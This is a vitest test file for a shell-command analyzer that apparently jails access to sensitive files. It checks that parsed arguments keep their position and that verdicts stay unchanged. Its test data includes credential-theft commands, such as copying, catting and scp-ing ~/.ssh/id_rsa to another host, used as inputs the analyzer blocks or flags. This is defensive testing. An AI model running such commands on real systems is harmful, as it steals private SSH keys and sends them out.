import { describe, it, expect } from 'vitest';
import mvdan from 'mvdan-sh';
import { positionedArgs, analyzeFsOperation, type PositionedArg } from '../shell/index';

// ─────────────────────────────────────────────────────────────────────────────
// STAGE 3: ARGUMENT POSITION
//
// Until this change the engine turned `cp ~/.ssh/id_rsa /tmp/k` into a bag of
// words -- {cp, <key>, /tmp/k} -- on one line of extractLiteralArgs:
//
//   if (v.startsWith('-')) flags.push(v); else paths.push(v);
//
// Which word came first, and which flag it followed, were thrown away. That is
// the single missing fact behind BUGS.md section A (three copy-verb fixes
// reverted) and behind the `rg "\.env\.local"` class of false positive: a
// search PATTERN and a PATH are the same token once position is gone.
//
// Stage 3 keeps the position. It changes NO verdict: `paths` is bit-identical
// to the old filter, which the second block below asserts, and the 396-command
// corpus diff for this commit is empty. Stage 4 is the first consumer.
// Design: doc/jail-stage3-4-position-design.md.
// ─────────────────────────────────────────────────────────────────────────────

const syntax = (mvdan as { syntax: any }).syntax;
const parser = syntax.NewParser();

/** The words of the first CallExpr, resolved the way the engine resolves them. */
function wordsOf(cmd: string): (string | null)[] {
  const f = parser.Parse(cmd, 'spec');
  const call = f.Stmts[0].Cmd;
  return (call.Args as unknown[]).map((w: any) => {
    let s = '';
    for (const p of w?.Parts ?? []) {
      const t = syntax.NodeType(p);
      if (t === 'Lit') s += (p.Value ?? '').replace(/\\(.)/g, '$1');
      else if (t === 'SglQuoted') s += p.Value ?? '';
      else if (t === 'DblQuoted') {
        const inner: any[] = p.Parts ?? [];
        if (!inner.every((ip: any) => syntax.NodeType(ip) === 'Lit')) return null;
        s += inner.map((ip: any) => ip.Value ?? '').join('');
      } else return null;
    }
    return s;
  });
}

const K = '/home/u/.ssh/id_rsa';

/** [command, the jailed word's slot, and the flag it followed] */
const SHAPES: Array<[string, { index: number; afterFlag: string | null }]> = [
  // the source slot: theft
  [`cp ${K} /tmp/k`, { index: 0, afterFlag: null }],
  [`mv ${K} /tmp/k`, { index: 0, afterFlag: null }],
  [`scp ${K} user@host:/tmp/`, { index: 0, afterFlag: null }],
  // the destination slot: a CI job installing a key
  [`cp /tmp/ci_key ${K}`, { index: 1, afterFlag: null }],
  [`mv /tmp/ci_key ${K}`, { index: 1, afterFlag: null }],
  // the flag operand: the key doing its job
  [`ssh -i ${K} host`, { index: 0, afterFlag: '-i' }],
  [`ssh-keygen -y -f ${K}`, { index: 0, afterFlag: '-f' }],
  [`scp -i ${K} dist.tgz host:/srv/`, { index: 0, afterFlag: '-i' }],
  // a flag BETWEEN operands breaks the link: -m 600 is install's, not the key's
  [`install -m 600 ${K} /tmp/k`, { index: 1, afterFlag: null }],
  // the search-pattern slot
  [`grep -r .ssh /home/u/project`, { index: 0, afterFlag: '-r' }],
];

describe('stage 3 — every word remembers its slot and the flag before it', () => {
  for (const [cmd, want] of SHAPES) {
    it(`${cmd}`, () => {
      const args = positionedArgs(wordsOf(cmd));
      const jailed = args.find((a) => a.value.includes('.ssh'));
      expect(
        jailed,
        `no jailed word found in: ${args.map((a) => a.value).join(' ')}`
      ).toBeDefined();
      expect({ index: jailed!.index, afterFlag: jailed!.afterFlag }).toEqual(want);
    });
  }

  it('a dynamic word breaks the flag link and does not occupy a slot', () => {
    const args = positionedArgs(wordsOf(`cp -v $SRC ${K}`));
    // `$SRC` is dynamic (null): not a slot. The key is therefore slot 0, and
    // `-v` is NOT its flag -- the dynamic word sat between them.
    expect(args.map((a) => a.value)).toEqual([K]);
    expect(args[0]).toMatchObject({ index: 0, afterFlag: null });
  });

  it('argv is the absolute index, index is the slot', () => {
    const args = positionedArgs(wordsOf(`tar -c -z -f /tmp/s.tgz ${K}`));
    const out = args.find((a) => a.value === '/tmp/s.tgz')!;
    const key = args.find((a) => a.value === K)!;
    expect(out).toMatchObject({ index: 0, argv: 4, afterFlag: '-f' });
    expect(key).toMatchObject({ index: 1, argv: 5, afterFlag: null });
  });
});

// The invariant that makes this stage safe to ship alone: the values, in order,
// are exactly what the old filter produced. If this block goes red, stage 3
// changed a verdict, which it must not.
describe('stage 3 — `paths` is the old filter, bit for bit', () => {
  const legacy = (words: (string | null)[]) =>
    words.slice(1).filter((w): w is string => w !== null && !w.startsWith('-'));
  it.each([
    [`cat ${K}`],
    [`cp ${K} /tmp/k`],
    [`ssh -i ${K} host`],
    [`env FOO=1 cat ${K}`],
    [`grep -r .ssh /home/u/project`],
    [`cp -v $SRC ${K}`],
    [`tar -c -z -f /tmp/s.tgz ${K}`],
    [`find /home/u/.ssh -type f -exec cat {} +`],
    [`git commit -m "cat ${K}"`],
  ])('%s', (cmd) => {
    const words = wordsOf(cmd);
    const values = positionedArgs(words).map((a: PositionedArg) => a.value);
    expect(values).toEqual(legacy(words));
  });

  it('and the jail gives the same verdicts it gave before this stage', () => {
    // A tiny in-file sample of the corpus diff, which must be EMPTY for this
    // commit (the full 396-row diff runs outside vitest, see the commit body).
    expect(analyzeFsOperation(`cat ${K}`)?.verdict).toBe('block');
    // Stage 4 landed (2026-09-12): a copy out of the jail is a review. This
    // row read `toBeNull()` while stage 3 shipped alone, which is how the two
    // stages stayed separable in the log.
    expect(analyzeFsOperation(`ssh -i ${K} host`)).toBeNull();
    expect(analyzeFsOperation(`grep -r .ssh /home/u/project`)).toBeNull();
  });
});

// Stage 4 landed 2026-09-12 and is the first CONSUMER of position. Its row sits
// apart from the stage-3 witness above so that block keeps meaning "stage 3
// changed no verdict": this row read `toBeNull()` while stage 3 shipped alone,
// which is how the two stages stayed separable in the log.
describe('stage 4 consumes position', () => {
  it('a copy out of the jail is a review', () => {
    expect(analyzeFsOperation(`cp ${K} /tmp/k`)?.verdict).toBe('review');
  });
});
